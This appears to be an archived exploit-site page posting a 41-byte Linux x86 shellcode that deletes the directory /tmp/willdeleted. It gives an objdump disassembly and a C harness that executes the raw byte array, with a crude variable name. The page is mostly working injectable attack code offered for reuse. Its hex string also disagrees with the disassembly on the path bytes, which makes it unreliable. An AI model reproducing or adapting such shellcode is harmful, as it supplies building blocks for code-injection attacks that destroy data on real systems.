<html><head><title>Linux/x86 - sys_rmdir(/tmp/willdeleted) - 41 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Name   : 41 bytes sys_rmdir(&quot;/tmp/willdeleted&quot;) x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : linux debian


root@localhost:/home/gunslinger/shellcode# objdump -d rmdir

rmdir:     file format elf32-i386

Disassembly of section .text:

08048060 &lt;.text&gt;:
 8048060:	eb 11                	jmp    0x8048073
 8048062:	31 c0                	xor    %eax,%eax
 8048064:	b0 28                	mov    $0x28,%al
 8048066:	31 db                	xor    %ebx,%ebx
 8048068:	5b                   	pop    %ebx
 8048069:	cd 80                	int    $0x80
 804806b:	31 c0                	xor    %eax,%eax
 804806d:	b0 01                	mov    $0x1,%al
 804806f:	31 db                	xor    %ebx,%ebx
 8048071:	cd 80                	int    $0x80
 8048073:	e8 ea ff ff ff       	call   0x8048062
 8048078:	2f                   	das    
 8048079:	74 6d                	je     0x80480e8
 804807b:	70 2f                	jo     0x80480ac
 804807d:	77 69                	ja     0x80480e8
 804807f:	6c                   	insb   (%dx),%es:(%edi)
 8048080:	6c                   	insb   (%dx),%es:(%edi)
 8048081:	64                   	fs
 8048082:	65                   	gs
 8048083:	6c                   	insb   (%dx),%es:(%edi)
 8048084:	65                   	gs
 8048085:	74 65                	je     0x80480ec
 8048087:	64                   	fs
root@localhost:/home/gunslinger/shellcode#
*/

#include &lt;stdio.h&gt;

char pussy[] =  &quot;\xeb\x11\x31\xc0\xb0\x28\x31&quot;
		&quot;\xdb\x5b\xcd\x80\x31\xc0\xb0&quot;
		&quot;\x01\x31\xdb\xcd\x80\xe8\xea&quot;
		&quot;\xff\xff\xff\x2f\x74\x6d\x70&quot;
		&quot;\x2f\x77\x69\x6c\x6c\x64\x65&quot;
		&quot;\x6c\x74\x65\x74\x65\x64&quot;;

int main(void)
{
	(*(void(*)()) pussy)();
     
return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
